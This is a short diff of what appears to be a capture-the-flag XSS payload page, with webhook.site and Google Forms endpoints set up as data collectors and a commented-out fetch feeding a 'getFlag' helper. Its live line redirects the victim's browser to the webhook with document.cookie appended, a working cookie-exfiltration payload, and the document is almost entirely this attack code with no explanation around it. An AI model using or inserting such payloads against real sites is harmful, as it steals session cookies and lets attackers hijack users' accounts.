@@ -35,12 +35,14 @@ layout: xss
     // let jsonProvaUrl = "https://jsonplaceholder.typicode.com/todos/1";
     let webhook = "https://webhook.site/654e914a-5c8c-46ae-bcf0-6b80c70bb7c8/";
     let webhook2 = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=";
+    document.location = webhook + "cookie=" + document.cookie;
 
     /*let options = {
         mode: 'no-cors' // 'cors' by default
     };*/
+    
     /*fetch(jsonProvaUrl)
         .then(res => { console.log(res); return res.text(); })
-        .then(text => { console.log(text); getFlag(webhook2, text) })*/
-    document.location = webhook + "cookie=" + document.cookie;
+        .then(text => { console.log(text); getFlag(webhook2, text) }); */
+    
 </script>
